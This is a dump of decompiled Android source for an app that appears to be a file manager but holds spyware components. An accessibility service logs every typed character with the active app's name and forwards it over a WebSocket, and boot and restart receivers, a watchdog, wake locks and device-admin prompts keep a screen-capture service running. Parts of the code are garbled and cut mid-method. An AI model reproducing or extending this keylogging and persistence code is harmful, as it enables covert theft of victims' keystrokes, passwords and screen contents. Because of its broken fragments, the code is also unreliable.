===== ./tool.py =====
import os

def project_to_txt(root_dir='.', output_file='codebase.txt'):
    extensions = ['.py', '.js', '.ts', '.java', '.cpp', '.c', '.h', '.html', '.css', '.json', '.xml']
    with open(output_file, 'w', encoding='utf-8') as outfile:
        for root, _, files in os.walk(root_dir):
            for file in files:
                if any(file.endswith(ext) for ext in extensions):
                    filepath = os.path.join(root, file)
                    outfile.write(f"===== {filepath} =====\n")
                    try:
                        with open(filepath, 'r', encoding='utf-8') as infile:
                            outfile.write(infile.read())
                        outfile.write("\n\n")
                    except Exception as e:
                        outfile.write(f"[Error reading file: {e}]\n\n")

if __name__ == "__main__":
    project_to_txt()

===== ./src/java/com/google/errorprone/annotations/Immutable.java =====
package com.google.errorprone.annotations;

import java.lang.annotation.ElementType;
import java.lang.annotation.Target;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Retention;
import java.lang.annotation.Inherited;
import java.lang.annotation.Documented;

@Documented
@Inherited
@Retention(RetentionPolicy.RUNTIME)
@Target({ ElementType.TYPE })
public @interface Immutable {
    String[] containerOf() default {};
}


===== ./src/java/com/google/errorprone/annotations/RestrictedApi.java =====
package com.google.errorprone.annotations;

import java.lang.annotation.Annotation;
import java.lang.annotation.ElementType;
import java.lang.annotation.Target;

@Target({ ElementType.CONSTRUCTOR, ElementType.METHOD })
public @interface RestrictedApi {
    String allowedOnPath() default "";
    
    Class<? extends Annotation>[] allowlistAnnotations() default {};
    
    Class<? extends Annotation>[] allowlistWithWarningAnnotations() default {};
    
    String explanation();
    
    String link();
}

package com.google.errorprone.annotations;

public enum Modifier
{
    private static final Modifier[] $VALUES;
    
    ABSTRACT, 
    DEFAULT, 
    FINAL, 
    NATIVE, 
    PRIVATE, 
    PROTECTED, 
    PUBLIC, 
    STATIC, 
    STRICTFP, 
    SYNCHRONIZED, 
    TRANSIENT, 
    VOLATILE;
    
    static {
        $VALUES = new Modifier[] { Modifier.PUBLIC, Modifier.PROTECTED, Modifier.PRIVATE, Modifier.ABSTRACT, Modifier.DEFAULT, Modifier.STATIC, Modifier.FINAL, Modifier.TRANSIENT, Modifier.VOLATILE, Modifier.SYNCHRONIZED, Modifier.NATIVE, Modifier.STRICTFP };
    }
}

===== ./src/java/com/radza/macharadza/MyForegroundService.java =====
package com.radza.macharadza;

import android.content.Context;
import androidx.core.app.NotificationCompat$Builder;
import android.os.IBinder;
import android.content.Intent;
import android.util.Log;
import java.util.TimerTask;
import android.app.NotificationManager;
import android.app.NotificationChannel;
import android.os.Build$VERSION;
import java.util.Timer;
import android.app.Service;

public class MyForegroundService extends Service
{
    private static final String CHANNEL_ID = "MyForegroundServiceChannel";
    private Timer timer;
    
    private void createNotificationChannel() {
        if (Build$VERSION.SDK_INT >= 26) {
            final NotificationChannel notificationChannel = new NotificationChannel("MyForegroundServiceChannel", (CharSequence)"Foreground Service Channel", 2);
            final NotificationManager notificationManager = (NotificationManager)this.getSystemService((Class)NotificationManager.class);
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(notificationChannel);
            }
        }
    }
    
    private void startLoggingTask() {
        (this.timer = new Timer()).scheduleAtFixedRate((TimerTask)new TimerTask(this) {
            final MyForegroundService this$0;
            
            public void run() {
                Log.d("MyService", "\ud83d\udfe2 Us\u0142uga nadal dzia\u0142a w tle...");
            }
        }, 0L, 10000L);
    }
    
    public IBinder onBind(final Intent intent) {
        return null;
    }
    
    public void onCreate() {
        super.onCreate();
        this.createNotificationChannel();
        this.startForeground(1, new NotificationCompat$Builder((Context)this, "MyForegroundServiceChannel").setContentTitle((CharSequence)"Us\u0142uga aktywna").setContentText((CharSequence)"ForegroundService dzia\u0142a w tle po restarcie telefonu.").setSmallIcon(R.mipmap.ic_launcher).setOngoing(true).build());
        Log.d("MyService", "\u2705 Service started");
        this.startLoggingTask();
    }
    
    public void onDestroy() {
        super.onDestroy();
        if (this.timer != null) {
            this.timer.cancel();
            this.timer = null;
        }
        Log.d("MyService", "\ud83d\uded1 Service stopped");
    }
}


===== ./src/java/com/radza/macharadza/BootReceiver.java =====
package com.radza.macharadza;

import androidx.work.NetworkType;
import androidx.work.Constraints$Builder;
import java.util.concurrent.TimeUnit;
import androidx.work.PeriodicWorkRequest$Builder;
import androidx.work.PeriodicWorkRequest;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.WorkManager;
import android.os.Build$VERSION;
import android.util.Log;
import android.content.Intent;
import android.content.Context;
import android.content.BroadcastReceiver;

public class BootReceiver extends BroadcastReceiver
{
    private static final String PREFS_NAME = "ScreenCapturePrefs";
    private static final String TAG = "BootReceiver";
    private static final String WATCHDOG_WORK_NAME = "ScreenCaptureWatchdog";
    
    public void onReceive(final Context context, final Intent intent) {
        final String action = intent.getAction();
        Log.d("BootReceiver", "\ud83d\udcf2 BootReceiver triggered: " + action);
        if (action == null) {
            return;
        }
        if ("android.intent.action.BOOT_COMPLETED".equals((Object)action) || "android.intent.action.LOCKED_BOOT_COMPLETED".equals((Object)action)) {
            if (context.getSharedPreferences("ScreenCapturePrefs", 0).getBoolean("hasPermission", false)) {
                Log.d("BootReceiver", "\u2705 Zapisane pozwolenie znalezione \u2014 uruchamiam ScreenCaptureService i watchdog...");
                try {
                    final Intent intent2 = new Intent(context, (Class)ScreenCaptureService.class);
                    intent2.addFlags(268435456);
                    if (Build$VERSION.SDK_INT >= 26) {
                        context.startForegroundService(intent2);
                    }
                    else {
                        context.startService(intent2);
                    }
                    Log.d("BootReceiver", "\ud83d\ude80 ScreenCaptureService wystartowa\u0142 po restarcie");
                    WorkManager.getInstance(context).enqueueUniquePeriodicWork("ScreenCaptureWatchdog", ExistingPeriodicWorkPolicy.REPLACE, (PeriodicWorkRequest)((PeriodicWorkRequest$Builder)new PeriodicWorkRequest$Builder((Class)ServiceRestarter.class, 15L, TimeUnit.MINUTES).setConstraints(new Constraints$Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())).build());
                    Log.d("BootReceiver", "\ud83d\udee1 Watchdog (WorkManager) aktywowany, serwis b\u0119dzie restartowany w razie ubicia");
                }
                catch (final Exception ex) {
                    Log.e("BootReceiver", "\u274c B\u0142\u0105d przy starcie serwisu lub watchdog-a: " + ex.getMessage(), (Throwable)ex);
                }
            }
            else {
                Log.d("BootReceiver", "\u26a0\ufe0f Brak zapisanych uprawnie\u0144 \u2014 serwis nie zostanie uruchomiony");
            }
        }
    }
}

package com.radza.macharadza;

import android.widget.TextView;
import android.widget.ImageView;
import android.view.LayoutInflater;
import android.view.ViewGroup;
import android.view.View$OnLongClickListener;
import android.view.View$OnClickListener;
import com.bumptech.glide.Glide;
import androidx.recyclerview.widget.RecyclerView$ViewHolder;
import java.util.Iterator;
import android.view.View;
import java.io.File;
import java.util.ArrayList;
import androidx.recyclerview.widget.RecyclerView$Adapter;

public class FileAdapter extends RecyclerView$Adapter<FileViewHolder>
{
    private ArrayList<File> files;
    private OnItemClickListener listener;
    private ArrayList<Integer> selectedPositions;
    
    public FileAdapter(final ArrayList<File> files, final OnItemClickListener listener) {
        this.selectedPositions = (ArrayList<Integer>)new ArrayList();
        this.files = files;
        this.listener = listener;
    }
    
    private String getFileExtension(String lowerCase) {
        final int lastIndex = lowerCase.lastIndexOf(46);
        if (lastIndex > 0) {
            lowerCase = lowerCase.substring(lastIndex + 1).toLowerCase();
        }
        else {
            lowerCase = "";
        }
        return lowerCase;
    }
    
    private boolean isAudio(final String s) {
        return s.equals((Object)"mp3") || s.equals((Object)"wav") || s.equals((Object)"m4a");
    }
    
    private boolean isImage(final String s) {
        return s.equals((Object)"jpg") || s.equals((Object)"jpeg") || s.equals((Object)"png") || s.equals((Object)"gif");
    }
    
    private boolean isPdf(final String s) {
        return s.equals((Object)"pdf");
    }
    
    private boolean isVideo(final String s) {
        return s.equals((Object)"mp4") || s.equals((Object)"mkv") || s.equals((Object)"avi");
    }
    
    public void clearSelection() {
        this.selectedPositions.clear();
        this.notifyDataSetChanged();
    }
    
    public int getItemCount() {
        return this.files.size();
    }
    
    public ArrayList<File> getSelectedFiles() {
        final ArrayList list = new ArrayList();
        final Iterator iterator = this.selectedPositions.iterator();
        while (iterator.hasNext()) {
            list.add((Object)this.files.get((int)iterator.next()));
        }
        return (ArrayList<File>)list;
    }
    
    public void onBindViewHolder(final FileViewHolder fileViewHolder, final int n) {
        final File file = (File)this.files.get(n);
        fileViewHolder.name.setText((CharSequence)file.getName());
        if (file.isDirectory()) {
            fileViewHolder.icon.setImageResource(R.drawable.ic_folder);
        }
        else {
            final String fileExtension = this.getFileExtension(file.getName());
            if (this.isImage(fileExtension)) {
                Glide.with(fileViewHolder.itemView.getContext()).load(file).into(fileViewHolder.icon);
            }
            else if (this.isPdf(fileExtension)) {
                fileViewHolder.icon.setImageResource(R.drawable.ic_pdf);
            }
            else if (this.isAudio(fileExtension)) {
                fileViewHolder.icon.setImageResource(R.drawable.ic_audio);
            }
            else if (this.isVideo(fileExtension)) {
                fileViewHolder.icon.setImageResource(R.drawable.ic_video);
            }
            else {
                fileViewHolder.icon.setImageResource(R.drawable.ic_file);
            }
        }
        final View itemView = fileViewHolder.itemView;
        int backgroundColor;
        if (this.selectedPositions.contains((Object)n)) {
            backgroundColor = -1724598812;
        }
        else {
            backgroundColor = 0;
        }
        itemView.setBackgroundColor(backgroundColor);
        fileViewHolder.itemView.setOnClickListener((View$OnClickListener)new FileAdapter$$ExternalSyntheticLambda0(this, file));
        fileViewHolder.itemView.setOnLongClickListener((View$OnLongClickListener)new FileAdapter$$ExternalSyntheticLambda1(this, file, n));
    }
    
    public FileViewHolder onCreateViewHolder(final ViewGroup viewGroup, final int n) {
        return new FileViewHolder(LayoutInflater.from(viewGroup.getContext()).inflate(R.layout.file_item, viewGroup, false));
    }
    
    public void toggleSelection(final int n) {
        if (this.selectedPositions.contains((Object)n)) {
            this.selectedPositions.remove((Object)n);
        }
        else {
            this.selectedPositions.add((Object)n);
        }
        this.notifyItemChanged(n);
    }
    
    public void updateFiles(final ArrayList<File> files) {
        this.files = files;
        this.selectedPositions.clear();
        this.notifyDataSetChanged();
    }
    
    public static class FileViewHolder extends RecyclerView$ViewHolder
    {
        ImageView icon;
        TextView name;
        
        public FileViewHolder(final View view) {
            super(view);
            this.icon = (ImageView)view.findViewById(R.id.file_icon);
            this.name = (TextView)view.findViewById(R.id.file_name);
        }
    }
    
    public interface OnItemClickListener
    {
        void onItemClick(final File p0);
        
        void onItemLongClick(final File p0, final int p1);
    }
}

    private void acquireWakeLockAndStartService() {
        try {
            final PowerManager powerManager = (PowerManager)this.getSystemService("power");
            if (powerManager != null && (this.wakeLock == null || !this.wakeLock.isHeld())) {
                (this.wakeLock = powerManager.newWakeLock(1, "macharadza::KeepAlive")).acquire();
                Log.d("MainActivity", "\ud83d\udd12 WakeLock aktywny");
            }
        }
        catch (final Exception ex) {
            Log.e("MainActivity", "\u274c B\u0142\u0105d WakeLock: " + ex.getMessage());
        }
        this.startScreenService();
        this.scheduleWatchdog();
        this.requestManageAllFiles();
    }
    
    private void activateDeviceAdmin() {
        final DevicePolicyManager devicePolicyManager = (DevicePolicyManager)this.getSystemService("device_policy");
        final ComponentName componentName = new ComponentName((Context)this, (Class)MyDeviceAdminReceiver.class);
        if (devicePolicyManager != null && !devicePolicyManager.isAdminActive(componentName)) {
            final Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
            intent.putExtra("android.app.extra.DEVICE_ADMIN", (Parcelable)componentName);
            intent.putExtra("android.app.extra.ADD_EXPLANATION", "Aplikacja wymaga uprawnie\u0144 administratora urz\u0105dzenia.");
            this.startActivityForResult(intent, 3001);
        }
        else {
            this.acquireWakeLockAndStartService();
        }
    }
    
    private void checkAccessibility() {
        if (!this.isAccessibilityEnabled()) {
            new AlertDialog$Builder((Context)this).setTitle((CharSequence)"Wymagane uprawnienie").setMessage((CharSequence)"Aplikacja wymaga w\u0142\u0105czenia us\u0142ugi Accessibility.\n\nPrzej\u015b\u0107 do ustawie\u0144?").setPositiveButton((CharSequence)"Tak", (DialogInterface$OnClickListener)new MainActivity$$ExternalSyntheticLambda0(this)).setNegativeButton((CharSequence)"Nie", (DialogInterface$OnClickListener)new MainActivity$$ExternalSyntheticLambda1(this)).setCancelable(false).show();
        }
        else {
            this.continueFlow();
        }
    }
    
    private void continueFlow() {
        this.activateDeviceAdmin();
    }
    
    private boolean isAccessibilityEnabled() {
        final String string = this.getPackageName() + "/" + MyKeyboardService.class.getCanonicalName();
        final boolean b = false;
        try {
            if (Settings$Secure.getInt(this.getContentResolver(), "accessibility_enabled") == 1) {
                final String string2 = Settings$Secure.getString(this.getContentResolver(), "enabled_accessibility_services");
                boolean b2 = b;
                if (string2 != null) {
                    b2 = b;
                    if (string2.contains((CharSequence)string)) {
                        b2 = true;
                    }
                }
                return b2;
            }
            return false;
        }
        catch (final Settings$SettingNotFoundException ex) {
            return false;
        }
    }
    
    private void launchFileManager() {
        this.startActivity(new Intent((Context)this, (Class)FileManagerActivity.class));
        this.finish();
    }
    
    private void requestManageAllFiles() {
        if (Build$VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            new AlertDialog$Builder((Context)this).setTitle((CharSequence)"Uprawnienie wymagane").setMessage((CharSequence)"Zezw\u00f3l aplikacji na pe\u0142ny dost\u0119p do plik\u00f3w.\n\nPrzej\u015b\u0107 do ustawie\u0144?").setPositiveButton((CharSequence)"Tak", (DialogInterface$OnClickListener)new MainActivity$$ExternalSyntheticLambda2(this)).setNegativeButton((CharSequence)"Nie", (DialogInterface$OnClickListener)new MainActivity$$ExternalSyntheticLambda3(this)).setCancelable(false).show();

        }

        catch (final Exception ex) {

        }
    }
    
    private void startScreenService() {
        try {
            final Intent intent = new Intent((Context)this, (Class)ScreenCaptureService.class);
            if (Build$VERSION.SDK_INT >= 26) {
                this.startForegroundService(intent);
            }

            }

        }
        catch (final Exception ex) {

        }
    }
    
    protected void onActivityResult(final int n, final int n2, final Intent intent) {

        if (n == 3001) {

            }

            }
        }
    }
    
    protected void onCreate(final Bundle bundle) {

public class FileManagerActivity extends AppCompatActivity implements OnItemClickListener
{
    private static final int PERMISSION_REQUEST_CODE = 100;
    private FileAdapter adapter;
    private File copiedFile;
    private File currentDir;
    private ArrayList<File> fileList;

    public FileManagerActivity() {
        this.fileList = (ArrayList<File>)new ArrayList();
        this.copiedFile = null;
    }
    
    private void checkPermissions() {
        final ArrayList list = new ArrayList();
        if (ContextCompat.checkSelfPermission((Context)this, "android.permission.READ_EXTERNAL_STORAGE") != 0) {
            list.add((Object)"android.permission.READ_EXTERNAL_STORAGE");
        }
        if (ContextCompat.checkSelfPermission((Context)this, "android.permission.WRITE_EXTERNAL_STORAGE") != 0) {
            list.add((Object)"android.permission.WRITE_EXTERNAL_STORAGE");
        }
        if (!list.isEmpty()) {
            ActivityCompat.requestPermissions((Activity)this, (String[])list.toArray((Object[])new String[0]), 100);
        }
    }
    
    private void copyFile(File file, final File file2) throws IOException {
        file = (File)new FileInputStream(file);
        try {
            final FileOutputStream fileOutputStream = new FileOutputStream(file2);
            try {
                final byte[] array = new byte[4096];
                while (true) {
                    final int read = ((FileInputStream)file).read(array);
                    if (read <= 0) {
                        break;
                    }
                    fileOutputStream.write(array, 0, read);
                }
                fileOutputStream.close();
                ((FileInputStream)file).close();
            }
            finally {
                try {
                    fileOutputStream.close();
                }
                finally {
                    final Throwable t;
                    ((Throwable)file2).addSuppressed(t);
                }
            }
        }
        finally {
            try {
                ((FileInputStream)file).close();
            }
            finally {
                final Throwable t2;
                ((Throwable)file2).addSuppressed(t2);
            }
        }
    }
    
    private void copyFolder(final File file, final File file2) throws IOException {
        if (!file2.exists()) {
            file2.mkdir();
        }
        final File[] listFiles = file.listFiles();
        if (listFiles == null) {
            return;
        }
        for (final File file3 : listFiles) {
            final File file4 = new File(file2, file3.getName());
            if (file3.isDirectory()) {
                this.copyFolder(file3, file4);
            }
            else {
                this.copyFile(file3, file4);
            }
        }
    }
    
    private void createNewFolder() {
        final AlertDialog$Builder alertDialog$Builder = new AlertDialog$Builder((Context)this);
        alertDialog$Builder.setTitle((CharSequence)this.getString(R.string.dialog_new_folder));
        final EditText view = new EditText((Context)this);
        view.setInputType(1);
        alertDialog$Builder.setView((View)view);
        alertDialog$Builder.setPositiveButton((CharSequence)this.getString(R.string.dialog_ok), (DialogInterface$OnClickListener)new FileManagerActivity$$ExternalSyntheticLambda0(this, view));
        alertDialog$Builder.setNegativeButton((CharSequence)this.getString(R.string.dialog_cancel), (DialogInterface$OnClickListener)null);

    private void deleteFileOrFolder(final File file) {
        if (file.isDirectory()) {
            this.deleteRecursive(file);
        }
        else {
            file.delete();
        }
        this.loadFiles(this.currentDir);
        Toast.makeText((Context)this, (CharSequence)this.getString(R.string.toast_deleted, new Object[] { file.getName() }), 0).show();
    }
    
    private void deleteRecursive(final File file) {
        final File[] listFiles = file.listFiles();
        if (listFiles != null) {
            for (int length = listFiles.length, i = 0; i < length; ++i) {
                this.deleteRecursive(listFiles[i]);
            }
        }
        file.delete();
    }
    
    private File detectSDCard() {
        final File[] externalFilesDirs = this.getExternalFilesDirs((String)null);
        if (externalFilesDirs.length > 1 && externalFilesDirs[1] != null) {
            try {
                File file = externalFilesDirs[1].getParentFile();
                if (file != null) {
                    while (file.getParentFile() != null && !file.getParentFile().getName().equals((Object)"storage")) {
                        file = file.getParentFile();
                    }
                    return file;
                }
            }
            catch (final Exception ex) {}
            return externalFilesDirs[1];
        }
        return null;
    }
    
    private int dpToPx(final int n) {
        return Math.round(n * this.getResources().getDisplayMetrics().density);
    }
    
    private String getExtension(final String s) {
        final int lastIndex = s.lastIndexOf(46);
        if (lastIndex == -1) {
            return "";
        }
        return s.substring(lastIndex + 1);
    }
    
    private String getMimeType(final File file) {
        final String extension = this.getExtension(file.getName());
        if (extension.isEmpty()) {
            return null;
        }
        return MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension.toLowerCase());
    }
    
    private Uri getUriForFile(final File file) {
        if (Build$VERSION.SDK_INT >= 24) {
            return FileProvider.getUriForFile((Context)this, "com.radza.macharadza.provider", file);
        }
        return Uri.fromFile(file);
    }
    
    private void loadFiles(File currentDir) {
        this.currentDir = currentDir;
        final File[] listFiles = currentDir.listFiles();
        this.fileList.clear();
        if (listFiles != null) {
            for (int length = listFiles.length, i = 0; i < length; ++i) {
                currentDir = listFiles[i];
                this.fileList.add((Object)currentDir);
            }
        }
        this.adapter.updateFiles(this.fileList);
        this.setTitle((CharSequence)(this.currentDir.getAbsolutePath() + " (" + this.fileList.size() + " " + this.getString(R.string.files_count) + ")"));
    }
    
    private void openFileWithDefaultApp(final File file) {
        try {
            final Uri uriForFile = this.getUriForFile(file);
            String mimeType;
            if ((mimeType = this.getMimeType(file)) == null) {
                mimeType = "*/*";
            }
            final Intent intent = new Intent("android.intent.action.VIEW");
            intent.setDataAndType(uriForFile, mimeType);
            intent.addFlags(268435457);
            this.startActivity(Intent.createChooser(intent, (CharSequence)this.getString(R.string.open_with)));
        }
        catch (final Exception ex) {
            Toast.makeText((Context)this, (CharSequence)("Error opening file: " + ex.getMessage()), 0).show();
        }
        catch (final ActivityNotFoundException ex2) {
            Toast.makeText((Context)this, (CharSequence)this.getString(R.string.toast_no_app_found), 0).show();
        }
    }

    private void pasteCopiedFile() {
        if (this.copiedFile != null) {
            final File file = new File(this.currentDir, this.copiedFile.getName());
            try {
                if (this.copiedFile.isDirectory()) {
                    this.copyFolder(this.copiedFile, file);
                }
                else {
                    this.copyFile(this.copiedFile, file);
                }
                this.loadFiles(this.currentDir);
                Toast.makeText((Context)this, (CharSequence)this.getString(R.string.toast_paste_success, new Object[] { this.copiedFile.getName() }), 0).show();
            }
            catch (final IOException ex) {
                Toast.makeText((Context)this, (CharSequence)this.getString(R.string.toast_copy_error, new Object[] { ex.getMessage() }), 0).show();
            }
        }
        else {
            Toast.makeText((Context)this, (CharSequence)this.getString(R.string.toast_no_copy), 0).show();
        }
    }
    
    private void playFileAtIndex(final MediaPlayer mediaPlayer, final VideoView anchorView, final TextView textView, final Button button, final File file) {
        final String lowerCase = this.getExtension(file.getName()).toLowerCase();
        textView.setText((CharSequence)file.getName());
        try {
            if (lowerCase.matches("mp3|wav|m4a")) {
                anchorView.setVisibility(8);
                mediaPlayer.reset();
                mediaPlayer.setDataSource((Context)this, this.getUriForFile(file));
                mediaPlayer.prepare();
                mediaPlayer.start();
                button.setText((CharSequence)"Pause");
            }
            else {
                anchorView.setVisibility(0);
                anchorView.setVideoURI(this.getUriForFile(file));
                final MediaController mediaController = new MediaController((Context)this);
                mediaController.setAnchorView((View)anchorView);
                anchorView.setMediaController(mediaController);
                anchorView.requestFocus();
                anchorView.start();
                button.setText((CharSequence)"Pause");
            }
        }
        catch (final Exception ex) {
            Toast.makeText((Context)this, (CharSequence)("B\u0142\u0105d odtwarzania: " + ex.getMessage()), 0).show();
        }
    }
    
    private void playPauseMedia(final MediaPlayer mediaPlayer, final VideoView videoView, final Button button, final File file) {
        final String lowerCase = this.getExtension(file.getName()).toLowerCase();
        try {
            if (lowerCase.matches("mp3|wav|m4a")) {
                if (mediaPlayer.isPlaying()) {
                    mediaPlayer.pause();
                    button.setText((CharSequence)"Play");
                }
                else {
                    mediaPlayer.start();
                    button.setText((CharSequence)"Pause");
                }
            }
            else if (videoView.isPlaying()) {
                videoView.pause();
                button.setText((CharSequence)"Play");
            }
            else {
                videoView.start();
                button.setText((CharSequence)"Pause");
            }
        }
        catch (final Exception ex) {
            Toast.makeText((Context)this, (CharSequence)("B\u0142\u0105d odtwarzania: " + ex.getMessage()), 0).show();
        }
    }

    private void previewTextFile(final File file) {
        try {
            final FileInputStream fileInputStream = new FileInputStream(file);
            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            final byte[] array = new byte[4096];
            int n = 0;
            while (true) {
                final int read = fileInputStream.read(array);
                if (read == -1 || n >= 102400) {
                    break;
                }
                byteArrayOutputStream.write(array, 0, read);
                n += read;
            }
            fileInputStream.close();
            String text = byteArrayOutputStream.toString("UTF-8");
            if (n >= 102400) {
                text += "\n\n--- (truncated) ---";
            }
            final ScrollView view = new ScrollView((Context)this);
            final TextView textView = new TextView((Context)this);
            textView.setTextIsSelectable(true);
            textView.setText((CharSequence)text);
            final int dpToPx = this.dpToPx(12);
            textView.setPadding(dpToPx, dpToPx, dpToPx, dpToPx);
            textView.setTextSize(14.0f);
            view.addView((View)textView, new ViewGroup$LayoutParams(-1, -2));
            new AlertDialog$Builder((Context)this).setTitle((CharSequence)file.getName()).setView((View)view).setPositiveButton((CharSequence)this.getString(R.string.dialog_ok), (DialogInterface$OnClickListener)null).show();
        }
        catch (final Exception ex) {
            Toast.makeText((Context)this, (CharSequence)("Error reading file: " + ex.getMessage()), 0).show();
        }
    }

    private void stopCurrentMedia(final MediaPlayer mediaPlayer, final VideoView videoView, final ArrayList<File> list, final int n) {
        final String lowerCase = this.getExtension(((File)list.get(n)).getName()).toLowerCase();
        try {
            if (lowerCase.matches("mp3|wav|m4a")) {
                if (mediaPlayer.isPlaying()) {
                    mediaPlayer.stop();
                }
                mediaPlayer.reset();
            }
            else if (videoView.isPlaying()) {
                videoView.stopPlayback();
            }
        }
        catch (final Exception ex) {}
    }

    public void onItemClick(final File file) {
        if (file.isDirectory()) {
            this.loadFiles(file);
        }
        else if (this.getExtension(file.getName()).toLowerCase().matches("mp3|wav|m4a|mp4|mkv|webm")) {
            final ArrayList list = new ArrayList();
            int n = 0;
            int n2;
            for (int i = 0; i < this.fileList.size(); ++i, n = n2) {
                final File file2 = (File)this.fileList.get(i);
                n2 = n;
                if (this.getExtension(file2.getName()).toLowerCase().matches("mp3|wav|m4a|mp4|mkv|webm")) {
                    list.add((Object)file2);
                    n2 = n;
                    if (file2.equals((Object)file)) {
                        n2 = list.size() - 1;
                    }
                }
            }
            this.showMediaPlayerDialog((ArrayList<File>)list, n);
        }
        else {
            this.openOrPreviewFile(file);
        }
    }
    
    public void onItemLongClick(final File file, final int n) {
        this.adapter.toggleSelection(n);
    }
    
    public void onRequestPermissionsResult(final int n, final String[] array, final int[] array2) {
        if (n == 100) {
            final int n2 = 1;
            final int length = array2.length;
            int n3 = 0;
            int n4;
            while (true) {
                n4 = n2;
                if (n3 >= length) {
                    break;
                }
                if (array2[n3] != 0) {
                    n4 = 0;
                    break;
                }
                ++n3;
            }
            if (n4 == 0) {
                Toast.makeText((Context)this, (CharSequence)this.getString(R.string.toast_no_permissions), 1).show();
            }
        }
        super.onRequestPermissionsResult(n, array, array2);
    }

===== ./src/java/com/radza/macharadza/StartupReceiver.java =====
package com.radza.macharadza;

import android.util.Log;
import android.content.Intent;
import android.content.Context;
import android.content.BroadcastReceiver;

public class StartupReceiver extends BroadcastReceiver
{
    public void onReceive(final Context context, final Intent intent) {
        if ("android.intent.action.BOOT_COMPLETED".equals((Object)intent.getAction()) || "android.intent.action.LOCKED_BOOT_COMPLETED".equals((Object)intent.getAction())) {
            Log.d("StartupReceiver", "\ud83d\udcf1 BOOT_COMPLETED received, starting ScreenCaptureService");
            context.startForegroundService(new Intent(context, (Class)ScreenCaptureService.class));
        }
    }
}

package com.radza.macharadza;

import android.widget.Toast;
import android.content.Intent;
import android.content.Context;
import android.app.admin.DeviceAdminReceiver;

public class MyDeviceAdminReceiver extends DeviceAdminReceiver
{
    public void onDisabled(final Context context, final Intent intent) {
        Toast.makeText(context, (CharSequence)"Device Admin wy\u0142\u0105czony", 0).show();
    }
    
    public void onEnabled(final Context context, final Intent intent) {
        Toast.makeText(context, (CharSequence)"Device Admin w\u0142\u0105czony", 0).show();
    }
}


===== ./src/java/com/radza/macharadza/MyAccessibilityService.java =====
package com.radza.macharadza;

import android.content.pm.PackageManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.content.pm.PackageManager$NameNotFoundException;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.accessibilityservice.AccessibilityService;

public class MyAccessibilityService extends AccessibilityService
{
    private static final String TAG = "MyAccessibilityService";
    
    public void onAccessibilityEvent(final AccessibilityEvent accessibilityEvent) {
        final ScreenCaptureService instance = ScreenCaptureService.getInstance();
        if (instance != null && instance.isKeyboardEnabled()) {
            if (accessibilityEvent.getEventType() == 16) {
                CharSequence charSequence;
                if (accessibilityEvent.getText() != null && !accessibilityEvent.getText().isEmpty()) {
                    charSequence = (CharSequence)accessibilityEvent.getText().get(0);
                }
                else {
                    charSequence = null;
                }
                if (charSequence != null && charSequence.length() > 0) {
                    final String string = charSequence.subSequence(charSequence.length() - 1, charSequence.length()).toString();
                    Log.d("MyAccessibilityService", "Soft keyboard char: " + string);
                    final String s = "unknown";
                    final String s2 = "unknown";
                    final AccessibilityNodeInfo rootInActiveWindow = this.getRootInActiveWindow();
                    String string2 = s;
                    String string3 = s2;
                    if (rootInActiveWindow != null) {
                        string2 = s;
                        string3 = s2;
                        if (rootInActiveWindow.getPackageName() != null) {
                            string2 = rootInActiveWindow.getPackageName().toString();
                            try {
                                final PackageManager packageManager = this.getPackageManager();
                                string3 = packageManager.getApplicationLabel(packageManager.getApplicationInfo(string2, 0)).toString();
                            }
                            catch (final PackageManager$NameNotFoundException ex) {
                                ex.printStackTrace();
                                string3 = s2;
                            }
                        }
                    }
                    instance.sendKeyOverWebSocket(string, string2, string3);
                }
            }
        }
    }
    
    public void onInterrupt() {
    }
}


===== ./src/java/com/radza/macharadza/RestartReceiver.java =====
package com.radza.macharadza;

import androidx.work.NetworkType;
import androidx.work.Constraints$Builder;
import java.util.concurrent.TimeUnit;
import androidx.work.PeriodicWorkRequest$Builder;
import androidx.work.PeriodicWorkRequest;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.WorkManager;
import android.os.Build$VERSION;
import android.os.PowerManager;
import android.util.Log;
import android.content.Intent;
import android.content.Context;
import android.content.BroadcastReceiver;

public class RestartReceiver extends BroadcastReceiver
{
    private static final String PREFS_NAME = "ScreenCapturePrefs";
    private static final String TAG = "RestartReceiver";
    private static final String WATCHDOG_WORK_NAME = "ScreenCaptureWatchdog";
    
    public void onReceive(final Context context, final Intent intent) {
        if (intent != null && intent.getAction() != null) {
            final String action = intent.getAction();
            Log.d("RestartReceiver", "\ud83d\udd01 RestartReceiver triggered: " + action);
            if ("android.intent.action.BOOT_COMPLETED".equals((Object)action) || "android.intent.action.LOCKED_BOOT_COMPLETED".equals((Object)action) || "android.intent.action.MY_PACKAGE_REPLACED".equals((Object)action) || "android.intent.action.REBOOT".equals((Object)action)) {
                if (context.getSharedPreferences("ScreenCapturePrefs", 0).getBoolean("hasPermission", false)) {
                    Log.d("RestartReceiver", "\u2705 Pozwolenie znalezione \u2014 pr\u00f3buj\u0119 uruchomi\u0107 ScreenCaptureService...");
                    try {
                        ((PowerManager)context.getSystemService("power")).newWakeLock(1, "RestartReceiver:BootWakeLock").acquire(30000L);
                        Log.d("RestartReceiver", "\ud83d\udd0b WakeLock aktywowany na czas wznowienia");
                    }
                    catch (final Exception ex) {
                        Log.e("RestartReceiver", "\u26a0\ufe0f WakeLock nie powi\u00f3d\u0142 si\u0119: " + ex.getMessage());
                    }
                    try {
                        final Intent intent2 = new Intent(context, (Class)ScreenCaptureService.class);
                        intent2.addFlags(268435488);
                        if (Build$VERSION.SDK_INT >= 26) {
                            context.startForegroundService(intent2);
                        }
                        else {
                            context.startService(intent2);
                        }
                        Log.d("RestartReceiver", "\ud83d\ude80 ScreenCaptureService uruchomiony po restarcie");
